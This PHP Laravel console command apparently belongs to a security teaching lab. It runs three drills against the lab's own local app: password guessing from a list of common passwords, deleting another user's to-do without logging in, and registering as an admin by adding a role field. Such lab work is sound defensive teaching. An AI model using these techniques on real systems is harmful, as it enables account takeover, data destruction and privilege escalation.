<?php

namespace App\Console\Commands;

use App\Models\Todo;
use App\Models\User;
use GuzzleHttp\Client;
use GuzzleHttp\Cookie\CookieJar;
use Illuminate\Console\Command;
use Illuminate\Support\Str;

// The attacker -- supplied, leave it alone. A script, not a browser: it sends HTTP requests to
// the app the way curl or a bot would. It fetches a page first to get a session cookie and a
// CSRF token (anyone can: the token protects against OTHER SITES posting as you, not against
// a script that reads your form), then sends the request your page would never send.
//
//   docker compose exec app php artisan attack guess [email]   drill 3: guess a password
//   docker compose exec app php artisan attack delete [id]     drill 4: delete without logging in
//   docker compose exec app php artisan attack admin           drill 5: register as an admin
class Attack extends Command
{
    protected $signature = 'attack {name? : guess, delete or admin} {target? : an email for guess, an id for delete}';

    protected $description = 'Run one of the login lab attacks against this app';

    // The app inside this container. (Your browser reaches the same server on port 8020.)
    private const BASE = 'http://127.0.0.1:8000';

    // Thirty common passwords. Real lists have millions.
    private const PASSWORDS = [
        '123456', '123456789', 'qwerty', '12345678', '111111', '1234567890', '1234567', 'qwerty123',
        '000000', 'iloveyou', 'abc123', 'letmein', 'monkey', 'dragon', 'sunshine', 'princess',
        'football', 'baseball', 'welcome', 'shadow', 'master', 'superman', 'trustno1', 'hello123',
        'password', 'freedom', 'whatever', 'qazwsx', 'starwars', 'admin',
    ];

    public function handle(): int
    {
        return match ($this->argument('name')) {
            'guess' => $this->guess((string) ($this->argument('target') ?? 'priya@example.edu')),
            'delete' => $this->deleteTodo((int) ($this->argument('target') ?? 2)),
            'admin' => $this->admin(),
            default => $this->usage(),
        };
    }

    private function usage(): int
    {
        $this->line('Which attack?');
        $this->line('  php artisan attack guess [email]   drill 3: try thirty common passwords');
        $this->line('  php artisan attack delete [id]     drill 4: delete a to-do without logging in');
        $this->line('  php artisan attack admin           drill 5: register with role=admin');

        return self::SUCCESS;
    }

    // Drill 3.
    private function guess(string $email): int
    {
        $this->info("Guessing the password for $email, one request at a time.");
        $client = $this->client($jar = new CookieJar);
        $token = $this->token($client, '/login');
        $refused = 0;

        foreach (self::PASSWORDS as $i => $password) {
            $n = str_pad((string) ($i + 1), 2, ' ', STR_PAD_LEFT);
            $response = $client->post('/login', ['form_params' => ['_token' => $token, 'email' => $email, 'password' => $password]]);
            $status = $response->getStatusCode();
            $to = $this->path($response->getHeaderLine('Location'));

            if ($status === 302 && $to !== '/login') {
                $this->line("  $n  ".str_pad($password, 12)."-> $status to $to");
                $this->error("  FOUND IT on guess $n: $email / $password. The attacker is now logged in.");

                return self::SUCCESS;
            }
            if ($status === 429) {
                $wait = $response->getHeaderLine('Retry-After');
                $this->line("  $n  ".str_pad($password, 12)."-> 429 Too Many Requests (Retry-After: {$wait}s)");
                if (++$refused === 3) {
                    $this->info('  The server stopped answering. At five guesses a minute, a list of a million takes about'
                        .' 140 days, for one account.');

                    return self::SUCCESS;
                }

                continue;
            }
            if ($status >= 500) {
                $this->line("  $n  ".str_pad($password, 12)."-> $status server error");
                $this->warn('  The server crashed. Did you run  php artisan migrate:fresh --seed  after drill 1?');

                return self::FAILURE;
            }
            $this->line("  $n  ".str_pad($password, 12)."-> $status back to /login (wrong)");
        }
        $this->info('  Not on the list. A longer list would have kept going.');

        return self::SUCCESS;
    }

    // Drill 4.
    private function deleteTodo(int $id): int
    {
        $todo = Todo::with('user')->find($id);
        if (! $todo) {
            $this->warn("There is no to-do $id. Put the seeded ones back:  php artisan migrate:fresh --seed");

            return self::FAILURE;
        }
        $this->info("To-do $id is \"{$todo->title}\", {$todo->user->name}'s. Logging in: not at all.");

        $client = $this->client(new CookieJar);
        $token = $this->token($client, '/login');   // any page hands out a token
        $response = $client->post("/todos/$id", ['form_params' => ['_token' => $token, '_method' => 'DELETE']]);
        $this->line("  DELETE /todos/$id  -> {$response->getStatusCode()} to ".$this->path($response->getHeaderLine('Location')));

        if (Todo::whereKey($id)->exists()) {
            $this->info("  To-do $id is still there. The server sent a stranger to log in.");
        } else {
            $this->error("  To-do $id is GONE, deleted by someone who never logged in.");
            $this->line('  (Put it back: php artisan migrate:fresh --seed)');
        }

        return self::SUCCESS;
    }

    // Drill 5.
    private function admin(): int
    {
        $email = 'mallory-'.Str::lower(Str::random(5)).'@example.com';
        $this->info("Registering $email with one extra field: role=admin");

        $client = $this->client(new CookieJar);
        $token = $this->token($client, '/register');
        $response = $client->post('/register', ['form_params' => [
            '_token' => $token, 'name' => 'Mallory', 'email' => $email,
            'password' => 'mallory-pass', 'password_confirmation' => 'mallory-pass',
            'role' => 'admin',   // the field the form does not have
        ]]);
        $this->line("  POST /register  -> {$response->getStatusCode()} to ".$this->path($response->getHeaderLine('Location')));

        $role = User::where('email', $email)->value('role');
        $this->line("  The new row's role: ".($role ?? '(no account was made)'));
        $admin = $client->get('/admin')->getStatusCode();
        $this->line("  GET /admin as Mallory  -> $admin");

        if ($role === 'admin') {
            $this->error('  Mallory is an ADMIN. She can read every list. Log in as her in the browser to see it:');
            $this->line("  $email / mallory-pass");
        } else {
            $this->info('  Mallory is an ordinary user. The extra field was ignored.');
        }

        return self::SUCCESS;
    }

    private function client(CookieJar $jar): Client
    {
        return new Client([
            'base_uri' => self::BASE, 'cookies' => $jar, 'allow_redirects' => false,
            'http_errors' => false, 'timeout' => 10, 'headers' => ['Accept' => 'text/html'],
        ]);
    }

    // GET a page, keep its cookies, and read the CSRF token out of its form.
    private function token(Client $client, string $path): string
    {
        $html = (string) $client->get($path)->getBody();

        return preg_match('/name="_token"\s+value="([^"]+)"/', $html, $m) ? $m[1] : '';
    }

    private function path(string $location): string
    {
        return $location === '' ? '(no redirect)' : (parse_url($location, PHP_URL_PATH) ?: '/');
    }
}
